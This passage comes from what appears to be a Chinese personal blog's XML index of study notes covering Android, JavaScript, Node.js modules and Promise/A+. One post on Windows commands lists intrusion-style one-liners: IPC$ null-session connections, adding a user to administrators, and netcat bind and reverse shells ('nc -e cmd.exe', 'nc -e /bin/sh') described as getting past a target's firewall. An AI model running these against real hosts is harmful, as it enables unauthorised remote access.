savedInstanceState.getInt("param"); Log.i(TAG, "onRestoreInstanceState called. get param: " + param); super.onRestoreInstanceState(savedInstanceState); &#125; &#125; 大家注意到，除了几个常见的方法外，我们还添加了onWindowFocusChanged、onSaveInstanceState、onRestoreInstanceState方法：1.onWindowFocusChanged方法：在Activity窗口获得或失去焦点时被调用，例如创建时首次呈现在用户面前；当前Activity被其他Activity覆盖；当前Activity转到其他Activity或按Home键回到主屏，自身退居后台；用户退出当前Activity。以上几种情况都会调用onWindowFocusChanged，并且当Activity被创建时是在onResume之后被调用，当Activity被覆盖或者退居后台或者当前Activity退出时，它是在onPause之后被调用，如图所示：]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SharedPreferences]]></title>
    <url>%2F2017%2F05%2F15%2Ffirst%2F</url>
    <content type="text"><![CDATA[获取SharedPreference的两种方法:1、调用Context对象的getSharedPreferences()方法2、调用Activity对象的getPreferences()方法两种方法的区别：调用Context对象的getSharedPreferences()方法获得的SharedPreferences对象可以被同一应用程序下的其他组件共享。调用Activity对象的getPreferences()方法获得的SharedPreferences对象只能在该Activity中使用。SharedPreferences的四种操作模式:Context.MODE_PRIVATEContext.MODE_APPENDContext.MODE_WORLD_READABLEContext.MODE_WORLD_WRITEABLEContext.MODE_PRIVATE：为默认操作模式,代表该文件是私有数据,只能被应用本身访问,在该模式下,写入的内容会覆盖原文件的内容Context.MODE_APPEND：模式会检查文件是否存在,存在就往文件追加内容,否则就创建新文件.Context.MODE_WORLD_READABLE和Context.MODE_WORLD_WRITEABLE用来控制其他应用是否有权限读写该文件.MODE_WORLD_READABLE：表示当前文件可以被其他应用读取.MODE_WORLD_WRITEABLE：表示当前文件可以被其他应用写入.将数据保存至SharedPreferences:SharedPreferences preferences=getSharedPreferences(“user”,Context.MODE_PRIVATE);Editor editor=preferences.edit();String name=”xixi”;String age=”22”;editor.putString(“name”, name);editor.putString(“age”, age);editor.commit(); 从SharedPreferences获取数据:SharedPreferences preferences=getSharedPreferences(“user”, Context.MODE_PRIVATE);String name=preferences.getString(“name”, “defaultname”);String age=preferences.getString(“age”, “0”);]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows命令篇]]></title>
    <url>%2F2017%2F05%2F14%2Ffirst%2F</url>
    <content type="text"><![CDATA[ftp命令ftp -v ip地址(或者域名) 进入主机文件(-v禁止显示远程服务器的响应)ftpftp -v ip地址(或者域名) -s:filename 上传文件 nbtstat命令tcp统计数据命令nbtstat -n 显示寄存在本地的名字和服务程序nbtstat -a 显示所有连接和监听端口nbtstat -c 显示缓存 nslookup命令nslookup www.baidu.com 查询这个域名的ip地址。nslookup -qt=mx baidu.com 查询mail服务器地址。nslookup -qt=ns baidu.com 查询主DNS和副DNS。nslookup -qt=A baidu.com 查询A记录。 ping命令ping ip地址ping ip地址 -t 不停的pingping ip地址(或域名)ping -a ip地址ping -t ip地址 -l 65 65的数据长度ping -t ip地址 -l 65 -i 生存时间 net命令net use \ip\ipc$ “ “ /user:” “ 建立IPC空链接net use \ip\ipc$ “密码” /user:”用户名” 建立IPC非空链接net use h: \ip\c$ “密码” /user:”用户名” 直接登陆后映射对方C：到本地为H:net use h: \ip\c$ 登陆后映射对方C：到本地为H:net use \ip\ipc$ /del 删除IPC链接net use h: /del 删除映射对方到本地的为H:的映射net user 用户名 密码 /add 建立用户net user guest /active:yes 激活guest用户net user 查看有哪些用户net user 帐户名 查看帐户的属性net localgroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限,注意：administrator后加s用复数net start 查看开启了哪些服务net start 服务名 开启服务；(如:net start telnet， net start schedule)net stop 服务名 停止某服务net time \目标ip 查看对方时间net time \目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息net view 查看本地局域网内开启了哪些共享net view \ip 查看对方局域网内开启了哪些共享net share abc(共享名称) /deletenet share abc=c:\windows pathping命令pathing ip地址(域名) 显示路由表tracert ip地址 telnet命令telnet ip地址 端口z从telnet回到shellfg从shell回到telnet nc命令参数说明：-h 查看帮助信息-d 后台模式-e prog程序重定向，一但连接就执行［危险］-i secs延时的间隔-l 监听模式，用于入站连接-L 监听模式，连接天闭后仍然继续监听，直到CTR+C-n IP地址，不能用域名-o film记录16进制的传输-p[空格]端口 本地端口号-r 随机本地及远程端口-t 使用Telnet交互方式-u UDP模式-v 详细输出，用-vv将更详细-w数字 timeout延时间隔-z 将输入，输出关掉（用于扫锚时）基本用法：nc -nvv 192.168.0.1 80 连接到192.168.0.1主机的80端口nc -l -p 80 开启本机的TCP 80端口并监听nc -nvv -w2 -z 192.168.0.1 80-1024 扫锚192.168.0.1的80-1024端口nc -l -p 5354 -t -e c:winntsystem32cmd.exe 绑定remote主机的cmdshell在remote的TCP 5354端口nc -t -e c:winntsystem32cmd.exe 192.168.0.2 5354 梆定remote主机的cmdshell并反向连接192.168.0.2的5354端口 高级用法：nc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止nc -L -p 80 &gt; c:\log.txt 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:\log.txtnc -L -p 80 &lt; c:\honeyport.txt 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把c:\honeyport.txt中内容送入管道中，亦可起到传送文件作用type.exe c:\honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端 口，直到CTR+C,并把c:\honeyport.txt中内容送入管道中,亦可起到传送文件作用 本机上用：nc -l -p 本机端口在对方主机上用：nc -e cmd.exe 本机IP -p 本机端口 win2Knc -e /bin/sh 本机IP -p 本机端口 linux,unix 反向连接突破对方主机的防火墙 ，本机上用：nc -d -l -p 本机端口 &lt; 要传送的文件路径及名称在对方主机上用：nc -vv 本机IP 本机端口 &gt; 存放文件的路径及名称 传送文件到对方主机 备 注：| 管道命令&lt; 或 &gt; 重定向命令。“&lt;”，例如：tlntadmn &lt; test.txt 指把test.txt的内容 赋值给tlntadmn命令＠ 表示执行＠后面的命令，但不会显示出来（后台执行）；例：＠dir c:\winnt d:\log.txt 意思是：后台执行dir，并把结果存在d:\log.txt中与&gt;&gt;的区别 “&gt;”指：覆盖；”&gt;&gt;”指：保存到(添加到）。如：@dir c:\winnt &gt;&gt; d:\log.txt和@dir c:\winnt &gt; d:\log.txt二个命令分别 执行二次比较看：用&gt;&gt;的则是把二次的结果都保存了，而用：&gt;则只有一次的结果，是因为第二次的结果把第一次的覆盖了。 tftp命令tftp -i ip地址 get 文件名 route命令路由表操作route add 209.98.32.33 mask 255.255.255.224 202.96.123.5 metric 5 添加路由表route delete 209.98.32.33 删除路由表]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>技术</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[计算机英语]]></title>
    <url>%2F2017%2F05%2F08%2Ffirst%2F</url>
    <content type="text"><![CDATA[语录FLAG_KEEP_SCREEN_ON: as long as this window is visible to the user, keep the device’s screen turned on and bright只要这个窗口对于用户时可见的，保持设备的屏幕常开并且明亮。]]></content>
      <categories>
        <category>英语</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javascript事件监听器]]></title>
    <url>%2F2017%2F04%2F27%2Fsecond%2F</url>
    <content type="text"><![CDATA[事件监听器Nodejs所有的异步I/O操作在完成时都会发送一个事件到事件队列。events模块只提供了一个对象:events.EventEmitter。EventEmitter的核心就是事件触发与事件监听器功能的封装。该模块已被node.js默认模块，不需要require()显示引入。EventEmitter对象如果在实例化时发生错误，会触发’error’事件。当添加新的监听器时，’newListener’时,’removeListener’事件被触发。 on(event,listener) 为指定事件注册一个监听器，接受一个字符串event和一个回调函数12345678var myEvent = new events.EventEmitter();var listener = function()&#123; console.log('someEvent emit');&#125;myEvent.on('someEvent',listener);setTimeout(function()&#123; myEvent.emit('someEvent');&#125;,1000); EventEmitter的每个事件由一个事件名和若干个参数组成，事件名是一个字符串，通常表达一定的语义。对于每个事件，EventEmitter支持若干个事件监听器。当事件触发时，注册到这个事件的事件监听器被依次调用，事件参数作为回调函数参数传递。1234567891011var myEvent = new events.EventEmitter();myEvent.on('someEvent',function(arg1,arg2) &#123; console.log('someEvent 1 emit',arg1,arg2);&#125;);myEvent.on('someEvent',(arg1,arg2)=&gt;console.log('someEvent 2 emit',arg1,arg2));myEvent.emit('someEvent','arg1','arg2');/*输出someEvent 1 emit arg1 arg2someEvent 2 emit arg1 arg2*/ once(event,listener)为指定事件注册一个单次监听器，即监听器最多只会触发一次，触发后立刻解除该监听器。 1234567891011var myEvent = new events.EventEmitter();myEvent.once('someEvent',function()&#123; console.log('someEvent emit');&#125;);myEvent.emit('someEvent');/*返回true输出 someEvent emit*/myEvent.emit('someEvent');//返回true removeListener(event,listener)移除指定事件的某个监听器，监听器必须是该事件已经注册过的监听器。 123456var myEvent = new events.EventEmitter();var listener = () =&gt; console.log('someEvent emit');myEvent.on('someEvent',listener);myEvent.removeListener('someEvent',listener);myEvent.emit('someEvent');//返回false 实例123456789101112131415161718192021function sel()&#123; this.events = &#123;&#125;; &#125; sel.prototype.on = function(eventName,callback)&#123; this.events[eventName] = this.events[eventName] || []; this.events[eventName].push(callback); &#125;; sel.prototype.emit = function(eventName)&#123; var args = Array.prototype.slice.call(arguments,1); var events = this.events[eventName]; var i,m; for(i=0,m=events.length;i&lt;m;i++)&#123; events[i].apply(null,args); &#125; &#125; var b = new sel(); b.on('send_message',function(msg)&#123; alert(msg); &#125;); b.emit('send_message',&#123;wo:1,ni:2&#125;); 程序中var that = this的意义可以看到，this对象在程序中随时会改变，而var that=this之后，that没改变之前仍然是指向当时的this，这样就不会出现找不到原来的对象。]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javascript知识点]]></title>
    <url>%2F2017%2F04%2F27%2Ffirst%2F</url>
    <content type="text"><![CDATA[Array.prototype.slice.call(arguments)应用Array.prototype.slice.call(arguments)能将具有length属性的对象转成数组1234var a=&#123;length:2,0:'first',1:'second'&#125;;Array.prototype.slice.call(a);// ["first","second"] var a=&#123;length:2&#125;;Array.prototype.slice.call(a);// [undefined, undefined] 可能刚开始学习js的童鞋并不是很能理解这句为什么能实现这样的功能。比如我就是一个，所以，来探究一下。 首先，slice有两个用法，一个是String.slice,一个是Array.slice，第一个返回的是字符串，第二个返回的是数组，这里我们看第2个。Array.prototype.slice.call(arguments)能够将arguments转成数组，那么就是arguments.toArray().slice();到这里，是不是就可以说Array.prototype.slice.call(arguments)的过程就是先将传入进来的第一个参数转为数组，再调用slice？再看call的用法，如下例子123456var a = function()&#123; console.log(this); // 'littledu' console.log(typeof this); // Object console.log(this instanceof String); // true&#125;a.call('littledu'); 可以看出，call了后，就把当前函数推入所传参数的作用域中去了，不知道这样说对不对，但反正this就指向了所传进去的对象就肯定的了。到这里，基本就差不多了，我们可以大胆猜一下slice的内部实现，如下123456789Array.prototype.slice = function(start,end)&#123; var result = new Array(); start = start || 0; end = end || this.length; //this指向调用的对象，当用了call后，能够改变this的指向，也就是指向传进来的对象，这是关键 for(var i = start; i &lt; end; i++)&#123; result.push(this[i]); &#125; return result;&#125; 大概就是这样吧，理解就行，不深究。最后，附个转成数组的通用函数123456789101112var toArray = function(s)&#123; try&#123; return Array.prototype.slice.call(s); &#125; catch(e)&#123; var arr = []; for(var i = 0,len = s.length; i &lt; len; i++)&#123; //arr.push(s[i]); arr[i] = s[i]; //据说这样比push快 &#125; return arr; &#125;&#125; javascript的call和apply函数每个JavaScript函数都会有很多附属的（attached）方法，包括toString()、call()以及apply()。听起来，你是否会感到奇怪，一个函数可能会有属于它自己的方法，但是记住，JavaScript中的每个函数都是一个对象。看一下 这篇文章 ，复习一下（refresher）JavaScript特性。你可能还想知道JavaScript中函数和方法的区别。我认为“函数”和“方法”的描述，仅仅是JavaScript的习惯约定而已。函数立足于它们自己（例如：alert()），而方法是函数内部一个对象的属性（dictionary）,我们通过对象来调用方法。每个JavaScript对象都有一个toString()方法，下面通过代码举例说明，在一个函数对象中，我们可以使用toString()方法。1234function foo()&#123; alert('x');&#125;alert(foo.toString()); 因为函数都是对象，它们有自己的属性和方法。我们可以把它们看作数据（data）。这篇文章，我们只关注两个函数的方法apply()以及call()。我们从下面的代码开始12345var x = 10;function f()&#123; alert(this.x);&#125;f(); 我们定义了一个全局函数f()。f()通过this关键字访问变量x，但是需要注意的是，我们不能通过一个对象的实例来调用这个函数。this指向的是什么对象呢？this会指向这个全局对象。我们的变量x就是在这个全局对象中定义的。上面的代码能够正常运行，运行结果会显示一个对话框，对话框中显示10。我们可以通过this来调用call()和apply()。正如下面的例子展示如何使用call()：1234567var x = 10;var o = &#123; x : 15&#125;;function f()&#123; alert(this.x);&#125;f();f.call(o); 首先调用f()将会显示10的对话框，因为this这个时候指向的是全局对象。然后我们调用f函数的call()方法，传入的参数是o，运行结果显示的是o中x属性的值15。call()方法会用它的第一个参数作为f函数的this指针。也就是说，我们会告诉运行时，f函数中的this指向的是哪个对象。this跳转听起来有些滑稽，甚至对于C++、Java以及C#程序员来说有些反常。这些都是ECMAScript中有趣的部分。通过call()也可以给函数传递参数：1234567var x = 10;var o = &#123; x : 15&#125;;function f()&#123; alert(this.x);&#125;f();f.call(o); apply()和call()类似的，只是apply()要求第二个参数必须是一个数组。这个数组会作为参数传递给目标函数。12345678var x = 10;var o = &#123;x : 15&#125;;function f(message) &#123; alert(message); alert(this.x);&#125;f('invoking f');f.apply(o, ['invoking f through apply']); apply()方法是很有用的，因为我们可以创建一个函数而不用去关心目标方法的参数。这个函数可以通过apply()的第二个数组参数来传递额外的参数给方法。123456789101112var o = &#123;x : 15&#125;;function f1(message1) &#123; alert(message1 + this.x);&#125;function f2(message1, message2) &#123; alert(message1 + (this.x * this.x) + message2);&#125;function g(object, func, args) &#123; func.apply(object, args);&#125;g(o, f1, ['the value of x = ']);g(o, f2, ['the value of x squared = ', '. Wow!']); 这样的语法有点问题。为了调用apply()方法，我们强制目标函数使用数组中的参数。幸运的是，有一个方法可以让这种语法更简单。在此之前，我们必须先介绍一个：参数标识符。在JavaScript中，其实每个函数都有一个可变长度的参数列表。这意味着，即使一个函数只有一个参数的时候，我们也可以传递5个参数给它。下面的代码不会有错误，而且结果显示的是“H”。1234function f(message) &#123; alert(message);&#125;f('H', 'e', 'l', 'l', 'o'); 在f()中，如果我们不想去接受其他的参数，我们可以用关键字arguments。arguments代表一个参数对象，它有一个代表长度的属性类似于数组。123456789function f(message) &#123; // message的值和arguments[0]是一样的 for(var i = 1; i &lt; arguments.length; i++)&#123; message += arguments[i]; &#125; alert(message);&#125;// 结果显示“Hello”f('H', 'e', 'l', 'l', 'o'); 你应该知道，严格来讲，arguments不是一个数组。arguments有一个length属性，但是没有split、push、pop方法。在前面的g()函数中，我们可以从arguments中拷贝需要的参数，组成数组，然后把这个数组传递给apply()。1234567891011121314var o = &#123;x : 15&#125;;function f(message1, message2) &#123; alert(message1 + ( this.x * this.x) + message2);&#125;function g(object, func) &#123; // arguments[0] = object // arguments[1] = func var args = []; for(var i = 2; i &lt; arguments.length; i++) &#123; args.push(arguments[i]); &#125; func.apply(object, args);&#125;g(o, f, 'The value of x squared = ', '. Wow!'); javascript逻辑运算符”||”和”\&amp;\&amp;”一、先来说说||（逻辑或）,从字面上来说，只有前后都是false的时候才返回false，否则返回true。1234alert(true||false); // truealert(false||true); // truealert(true||true); // truealert(false||false); // false 但是，从深层意义上来说的话，却有另一番天地，试下面代码1alert(0||1); 显然，我们知道，前面0意味着false,而后面1意味着true,那么上面的结果应该是true,而事实返回的结果是1。再看下面代码：1alert(2||1); 我们知道，前面2是true,后面1也是true,那返回结果又是什么呢？测试结果是2,继续看：1alert('a'||1); 同样，前面’a’是true，后面1也是true;测试结果是’a’,下面1alert(''||1); 由上，我们知道前面’’是false,后面1是true,而返回结果是1。再看下面1alert('a'||0); 前面’a’是true，而后面0是false,返回结果是’a’，继续下面1alert('a'||'b'); 前面’a’是true,后面’b’是false,返回结果是’a’，我们继续下面1alert(''||0); 前面’’是false,后面0同样是false,返回结果是01alert(0||''); 前面0是false，后面’’是false，返回结果是’’这就意味 1、只要“||”前面为false,不管“||”后面是true还是false，都返回“||”后面的值。 2、只要“||”前面为true,不管“||”后面是true还是false，都返回“||”前面的值。二、下面说说&amp;&amp;（逻辑与）,从字面上来说，只有前后都是true的时候才返回true，否则返回false。1234alert(true&amp;&amp;false); // falsealert(true&amp;&amp;true); // truealert(false&amp;&amp;false); // falsealert(false&amp;&amp;true); // false 然后，根据上面经验，我们看看“&amp;&amp;”号前后，不单单是布尔类型的情况。1alert(''&amp;&amp;1); 结是返回’’,“&amp;&amp;”前面’’是false,后面是1是true。1alert(''&amp;&amp;0); 结是返回’’,“&amp;&amp;”前面’’是false,后面是0也是false。1alert('a'&amp;&amp;1); 结是返回1,“&amp;&amp;”前面’’a是true,后面是1也是true。1alert('a'&amp;&amp;0); 结是返回0,“&amp;&amp;”前面’’a是true,后面是0是false。1alert('a'&amp;&amp;''); 结是返回’’,“&amp;&amp;”前面’’a是true,后面是’’是false。1alert(0&amp;&amp;'a'); 结是返回0,“&amp;&amp;”前面’’0是false,后面是’a’是true。1alert(0&amp;&amp;''); 结是返回0,“&amp;&amp;”前面’’0是false,后面是’’也是false。这意味着 1、只要“&amp;&amp;”前面是false，无论“&amp;&amp;”后面是true还是false，结果都将返“&amp;&amp;”前面的值;2、只要“&amp;&amp;”前面是true，无论“&amp;&amp;”后面是true还是false，结果都将返“&amp;&amp;”后面的值;让我们总结一下：1、只要“||”前面为false，无论“||”后面是true还是false，结果都返回“||”后面的值。2、只要“||”前面为true，无论“||”后面是true还是false，结果都返回“||”前面的值。3、只要“&amp;&amp;”前面是false，无论“&amp;&amp;”后面是true还是false，结果都将返“&amp;&amp;”前面的值;4、只要“&amp;&amp;”前面是true，无论“&amp;&amp;”后面是true还是false，结果都将返“&amp;&amp;”后面的值;由上两个测试可知，逻辑运算符，“||”和“&amp;&amp;”都是遵行短路原则，只要确定符号前面的真假，既可确定返回值。需要说明的是“&amp;&amp;”的优先级是高于“||”的，下面测试：1alert(1||'a'&amp;&amp;2); 返回结果是1。根据反证原理，我们假设“||”的优先级不低于“&amp;&amp;”（这里只所以用“不低于”，是为了同时证明等级相同的情况）。根据上面我们得出的结论（1），（1||’a’）将返回前面的值1，(1&amp;&amp;2)根据结论(4)应该返回后面的值2。这显然不对，由此可知“&amp;&amp;”的优先级是高于“||”的。 javascript splice()方法splice() 方法向/从数组中添加/删除项目，然后返回被删除的项目。123456789101112131415&lt;script type="text/javascript"&gt;var arr = new Array(6)arr[0] = "George"arr[1] = "John"arr[2] = "Thomas"arr[3] = "James"arr[4] = "Adrew"arr[5] = "Martin"document.write(arr + "&lt;br /&gt;")arr.splice(2,0,"William")document.write(arr + "&lt;br /&gt;")&lt;/script&gt; 输出:12George,John,Thomas,James,Adrew,MartinGeorge,John,William,Thomas,James,Adrew,Martin]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>实用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xml2js模块]]></title>
    <url>%2F2017%2F04%2F26%2Fsecond%2F</url>
    <content type="text"><![CDATA[xml2js模块应用并不是所有的API都是以JSON格式返回的。我们有时侯不得不处理一些XML。幸运的是有一个NodeJS模块 xml2js 可以帮你做这件事。 处理一段xml文件内容12345678910111213&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;business&gt; &lt;company&gt;Code Blog&lt;/company&gt; &lt;owner&gt;Nic Raboy&lt;/owner&gt; &lt;employee&gt; &lt;firstname&gt;Nic&lt;/firstname&gt; &lt;lastname&gt;Raboy&lt;/lastname&gt; &lt;/employee&gt; &lt;employee&gt; &lt;firstname&gt;Maria&lt;/firstname&gt; &lt;lastname&gt;Campos&lt;/lastname&gt; &lt;/employee&gt;&lt;/business&gt; 最关键的一点是安装xml2js库，所以你可以在命令行输入在app.js中添加如下内容12345var parseString = require('xml2js').parseString;var xml = '&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;business&gt;&lt;company&gt;Code Blog&lt;/company&gt;&lt;owner&gt;Nic Raboy&lt;/owner&gt;&lt;employee&gt;&lt;firstname&gt;Nic&lt;/firstname&gt;&lt;lastname&gt;Raboy&lt;/lastname&gt;&lt;/employee&gt;&lt;employee&gt;&lt;firstname&gt;Maria&lt;/firstname&gt;&lt;lastname&gt;Campos&lt;/lastname&gt;&lt;/employee&gt;&lt;/business&gt;';parseString(xml, function (err, result) &#123; console.dir(JSON.stringify(result));&#125;); 编译app.js1&gt; node app.js 如果一切顺利你会得到JSON格式的输出：12345678910111213141516&#123; "business": &#123; "company": [ "Code Blog" ], "owner": [ "Nic Raboy" ], "employee": [ &#123; "firstname": [ "Nic" ], "lastname": [ "Raboy" ] &#125;, &#123; "firstname": [ "Maria" ], "lastname": [ "Campos" ] &#125; ] &#125;&#125; 有一点需要注意，XML字符串元素转换成了JSON的数组。你可能期望 { owner: “Nic Raboy” } 但实际输出的是 { owner: [ “Nic Raboy” ] }，但这不是什么大问题。注* 可以通过 explicitArray: false 来解决: 1xml2js.parseString(xmlStr, &#123; explicitArray : false, ignoreAttrs : true &#125;, callbackMethod); 性能比较有人指出xml2js的速度过慢，有人做过性能测试， htmlparser2 的性能提升大约5倍以上，如下图另外还有一个使用C语言写的xml解析器 node-expat ，性能更好，安装1npm i node-expat 不过使用也很“底层“, 对性能有一定要求的应用可以尝试一下：12345678910111213141516171819202122232425(function () &#123; "use strict"; var expat = require('node-expat') var parser = new expat.Parser('UTF-8') parser.on('startElement', function (name, attrs) &#123; console.log(name, attrs) &#125;) parser.on('endElement', function (name) &#123; console.log(name) &#125;) parser.on('text', function (text) &#123; console.log(text) &#125;) parser.on('error', function (error) &#123; console.error(error) &#125;) parser.write('&lt;html&gt;&lt;head&gt;&lt;title&gt;Hello World&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;Foobar&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;')&#125;()) 不过还有一些项目对 expat 进行了封装，简化了调用接口，比如： xml2obj-stream]]></content>
      <categories>
        <category>NodeJs</category>
        <category>npm模块</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常用模块]]></title>
    <url>%2F2017%2F04%2F26%2Fsixth%2F</url>
    <content type="text"><![CDATA[日期处理类库moment模块官网:http://momentjs.cn/ 集合操作lodash框架官网:http://lodashjs.com/docs/underscore模块官网: http://www.css88.com/doc/underscore/ 参考手册CSS参考手册: http://www.css88.com/book/css/jquery参考手册: http://www.css88.com/jqapi-1.9/less参考手册: http://www.css88.com/doc/less/backbone参考手册: http://www.css88.com/doc/backbone/jquery-ui参考手册: http://www.css88.com/jquery-ui-api/前端参考手册: http://www.css88.com/nav/]]></content>
      <categories>
        <category>NodeJs</category>
        <category>npm模块</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Prommise规范]]></title>
    <url>%2F2017%2F04%2F26%2Fforth%2F</url>
    <content type="text"><![CDATA[Promise简介Promise是一个拥有then方法的对象或函数，其行为符合本规范;thenable是一个定义了then方法的对象或函数，文中译作”拥有then方法”;值(value)指任何javascript的合法值(包括undefined,thenable和promise);异常(exception)是使用throw语句抛出的一个值。拒绝原因(reason)表示一个promise的拒绝原因。 Promise的状态一个Promise的当前状态必须为以下三种状态中的一种:等待态、完成态，拒绝态。等待态(Pending)处于等待态时，promise 需满足以下条件： 可以迁移至完成态或拒绝态 完成态(Fulfilled)处于完成态时，promise需满足以下条件: 不能迁移至其他任何状态 必须拥有一个不可变的终值 拒绝态(Rejected)处于拒绝态时，promise 需满足以下条件： 不能迁移至其他任何状态 必须拥有一个不可变的据因 这里的不可变指的是恒等（即可用 === 判断相等），而不是意味着更深层次的不可变Then 方法一个 promise 必须提供一个 then 方法以访问其当前值、终值和据因。promise 的 then 方法接受两个参数：promise.then(onFulfilled, onRejected)参数可选 如果 onFulfilled 不是函数，其必须被忽略 如果 onRejected 不是函数，其必须被忽略 注：如果我们只想传onRejected而不想传onFulfilled，可以这么写：pormise.then(null, onRejected) onFulfilled特性如果 onFulfilled 是函数： 当 promise 执行结束后其必须被调用，其第一个参数为 promise 的终值 在 promise 执行结束前其不可被调用 其调用次数不可超过一次 onRejected特性如果 onRejected 是函数： 当 promise 被拒绝执行后其必须被调用，其第一个参数为 promise 的据因 在 promise 被拒绝执行前其不可被调用 其调用次数不可超过一次 调用时机 onFulfilled 和 onRejected 只有在执行环境堆栈仅包含平台代码时才可被调用 调用要求onFulfilled 和 onRejected 必须被作为函数调用（即没有 this 值） 多次调用then方法可以被同一个promise调用多次 当 promise 成功执行时，所有 onFulfilled 需按照其注册顺序依次回调 当 promise 被拒绝执行时，所有的 onRejected 需按照其注册顺序依次回调 返回then 方法必须返回一个 promise 对象promise2 = promise1.then(onFulfilled, onRejected);如果 onFulfilled 或者 onRejected 返回一个值 x ，则运行下面的 Promise 解决过程：[Resolve] 如果 onFulfilled 或者 onRejected 抛出一个异常 e ，则 promise2 必须拒绝执行，并返回拒因 e 如果 onFulfilled 不是函数且 promise1 成功执行， promise2 必须成功执行并返回相同的值 如果 onRejected 不是函数且 promise1 拒绝执行， promise2 必须拒绝执行并返回相同的据因 Promise解决过程Promise 解决过程 是一个抽象的操作，其需输入一个 promise 和一个值，我们表示为 [Resolve]，如果 x 有then 方法且看上去像一个 Promise ，解决程序即尝试使 promise 接受 x 的状态；否则其用 x 的值来执行 promise 。这种 thenable 的特性使得 Promise 的实现更具有通用性：只要其暴露出一个遵循 Promise/A+ 协议的 then 方法即可；这同时也使遵循 Promise/A+ 规范的实现可以与那些不太规范但可用的实现能良好共存。运行 [Resolve] 需遵循以下步骤： x与promise相等如果 x 为 Promise ，则使 promise 接受 x 的状态 如果 x 处于等待态， promise 需保持为等待态直至 x 被执行或拒绝 如果 x 处于完成态，用相同的值执行 promise 如果 x 处于拒绝态，用相同的据因拒绝 promise 注：这里就是解释我们链式调用then时，可以继续进行异步操作，只要在onFulfilled中继续返回一个promise对象即可。例如：runAsync1().then(function(data){ console.log(data); return runAsync2(); //返回值为promise对象}).then(function(data){ console.log(data); return runAsync3();}) x为对象或函数如果 x 为对象或者函数： 把 x.then 赋值给 then 如果取 x.then 的值时抛出错误 e ，则以 e 为据因拒绝 promise 如果 then 是函数，将 x 作为函数的作用域 this 调用之。传递两个回调函数作为参数，第一个参数叫做 resolvePromise ，第二个参数叫做 rejectPromise: 如果 resolvePromise 以值 y 为参数被调用，则运行 [Resolve] 如果 rejectPromise 以据因 r 为参数被调用，则以据因 r 拒绝 promise 如果 resolvePromise 和 rejectPromise 均被调用，或者被同一参数调用了多次，则优先采用首次调用并忽略剩下的调用 如果调用 then 方法抛出了异常 e： 如果 resolvePromise 或 rejectPromise 已经被调用，则忽略之 否则以 e 为据因拒绝 promise 如果 then 不是函数，以 x 为参数执行 promise 如果 x 不为对象或者函数，以 x 为参数执行 promise如果一个 promise 被一个循环的 thenable 链中的对象解决，而 [Resolve] 的递归性质又使得其被再次调用，根据上述的算法将会陷入无限递归之中。算法虽不强制要求，但也鼓励施者检测这样的递归是否存在，若检测到存在则以一个可识别的TypeError 为据因来拒绝 promise 解释 这里的平台代码指的是引擎、环境以及 promise 的实施代码。实践中要确保 onFulfilled 和 onRejected 方法异步执行，且应该在 then 方法被调用的那一轮事件循环之后的新执行栈中执行。这个事件队列可以采用“宏任务（macro-task）”机制或者“微任务（micro-task）”机制来实现。由于 promise 的实施代码本身就是平台代码（译者注： 即都是 JavaScript），故代码自身在处理在处理程序时可能已经包含一个任务调度队列或跳板 也就是说在 严格模式（strict） 中，函数 this 的值为 undefined ；在非严格模式中其为全局对象。 代码实现在满足所有要求的情况下可以允许 promise2 === promise1 。每个实现都要文档说明其是否允许以及在何种条件下允许 promise2 === promise1 。 总体来说，如果 x 符合当前实现，我们才认为它是真正的 promise 。这一规则允许那些特例实现接受符合已知要求的 Promises 状态。 这步我们先是存储了一个指向 x.then 的引用，然后测试并调用该引用，以避免多次访问 x.then 属性。这种预防措施确保了该属性的一致性，因为其值可能在检索调用时被改变。 实现不应该对 thenable 链的深度设限，并假定超出本限制的递归就是无限循环。只有真正的循环递归才应能导致 TypeError 异常；如果一条无限长的链上 thenable 均不相同，那么递归下去永远是正确的行为。]]></content>
      <categories>
        <category>NodeJs</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Prommise规范]]></title>
    <url>%2F2017%2F04%2F26%2Ffifth%2F</url>
    <content type="text"><![CDATA[针对Promise开发的一种框架实例:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145var Promise = require("bluebird");var fs = require("fs");//方法Promise化var readFileAsync = Promise.promisify(fs.readFile);//.spread([Function fulfilledHandler] [, Function rejectedHandler ]) -&gt; Promise//用法:将结果集拆分//examplePromise.delay(0).then(function () &#123; return [ readFileAsync('1.txt', 'utf-8'), readFileAsync('2.txt', 'utf-8'), readFileAsync('3.txt', 'utf-8') ];&#125;).spread(function (file1, file2, file3) &#123; console.log(file1); console.log(file2); console.log(file3);&#125;)//.finally(Function handler) -&gt; Promise//类似try..catch..finally中finally的作用//examplePromise.delay(0).then(function () &#123; 